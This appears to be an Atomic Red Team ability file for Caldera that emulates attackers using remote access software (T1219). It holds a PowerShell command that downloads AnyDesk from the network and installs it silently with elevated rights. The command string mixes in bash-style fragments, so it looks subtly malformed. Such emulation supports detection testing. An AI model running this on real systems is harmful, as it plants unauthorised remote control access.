- id: 6b8b7391-5c0a-4f8c-baee-78d8ce0ce330
  name: AnyDesk Files Detected Test on Windows
  description: An adversary may attempt to trick the user into downloading AnyDesk
    and use to establish C2. Download of AnyDesk installer will be at the destination
    location and ran when sucessfully executed.
  tactic: command-and-control
  technique:
    attack_id: T1219
    name: Remote Access Software
  platforms:
    windows:
      psh:
        command: 'if(Test-Path "PathToAtomicsFolder\..\ExternalPayloads\AnyDesk.exe")
          {; exit 0; } else {; exit 1; }; then : ; else $parentpath = Split-Path "PathToAtomicsFolder\..\ExternalPayloads\AnyDesk.exe";
          New-Item -Type Directory "$parentpath" -ErrorAction Ignore -Force | Out-Null;
          Invoke-WebRequest -Uri https://download.anydesk.com/AnyDesk.exe -OutFile
          "PathToAtomicsFolder\..\ExternalPayloads\AnyDesk.exe"; fi; Start-Process
          "PathToAtomicsFolder\..\ExternalPayloads\AnyDesk.exe" /S;'
        cleanup: Stop-Process -Name "AnyDesk" -Force; Start-Sleep -Seconds 5; Remove-Item
          "#{installer_path}" -ErrorAction Ignore
        elevation_required: true
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - command-and-control
  - atomic-red-team
  - t1219
  author: Atomic Red Team
  additional_info:
    input_arguments:
      installer_path:
        description: where the AnyDesk will be downloaded to or already is located
        type: path
        default: PathToAtomicsFolder\..\ExternalPayloads\AnyDesk.exe
      download_url:
        description: url to download AnyDesk from
        type: url
        default: https://download.anydesk.com/AnyDesk.exe
    dependencies:
    - description: 'AnyDesk must exist on disk at the specified location (#{installer_path})

        '
      prereq_command: "if(Test-Path \"#{installer_path}\") {\n    exit 0\n} else {\n\
        \    exit 1\n}\n"
      get_prereq_command: '$parentpath = Split-Path "#{installer_path}"

        New-Item -Type Directory "$parentpath" -ErrorAction Ignore -Force | Out-Null

        Invoke-WebRequest -Uri #{download_url} -OutFile "#{installer_path}"

        '
    technique_created: '2018-04-18T17:59:24.739Z'
